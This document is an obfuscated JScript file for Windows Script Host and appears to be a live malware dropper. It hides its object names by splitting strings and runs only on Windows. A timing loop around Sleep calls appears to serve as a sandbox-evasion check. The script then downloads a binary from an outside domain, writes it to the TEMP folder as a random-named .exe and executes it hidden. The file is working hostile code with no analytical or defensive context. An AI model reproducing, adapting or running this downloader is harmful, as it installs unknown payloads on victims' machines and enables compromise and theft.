var YR = false;
var WM = "Create"+"Object";
var I = function B() {return WScript[WM]("WScript"+".Shell");}(), W = 11;
var KF = "MSXML2"+".XMLHTTP";
var Z0 = 2;
var PL = Z0 - 2;
function P(J0){I["Run"](J0, PL, PL);};
function ZR(){return KF + "";};
function ON(EB, CG){PL = PL * 1; return EB - CG;};
function DD(){return WM;};
/*@cc_on
  @if (@_win32 || @_win64)
    YR = true;
  @end
@*/
if (YR)
{
var HR = "";
function E(){return 22;};
var LD = 0; var D = 0;
function Y()
{
var ER = new this["Date"]();
var KX = ER["getUTCMilliseconds"]();
WScript["Sleep"](E());
var ER = new this["Date"]();
var GY = ER["getUTCMilliseconds"]();
WScript["Sleep"](E());
var ER = new this["Date"]();
var X = ER["getUTCMilliseconds"]();
var LD = "YT";
LD = ON(GY, KX);
var D = "G";
D = ON(X, GY);
HR = "open";
return ON(LD, D);
}
var VC = false;
var Z1 = false;
for (var N = PL; N < E() * 1; N++){if (Y() != PL){
VC = true; 
D = "31" + 11 * LD + D; 
Z1 = true; 
break;
}}
function QW() {return ((VC == true) && (VC == Z1)) ? 1 : PL;};
if (VC && QW() && Z1){
function U() {return I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xleeqZ2EzE.ex" + "e";};
 IP = ZR();
 AR = WScript[WM](IP);
 var E0 = 1;
do { 
	for (;E0;){
	try {
		if (E0 == 1)
		{
			AR[HR]("GET", "http://be-stlines-tore.com/u3rsap", false);
			AR["send"]();
			F = "Sleep";
			E0 = 2;
		}
		WScript[F](E() + 120); 
		if (AR["readystate"] < 2 * 2) continue;
		E0 = PL;
		function J(Z) {var DH = (1, 2, 3, 4, 5, Z); return DH;};
		V = WScript[DD()]("ADODB.Stream");
		IP = V;
		IP[HR]();
		IP["type"] = J(1);
		IP["write"](AR["ResponseBody"]);
		V["position"] = J(PL);
		IP["Save" + "ToFile"](U(), 2);
		V["cl"+"ose"]();
		U0 = U();
		P(U0);
	} catch(F0){};};
}while (E0);
}
}

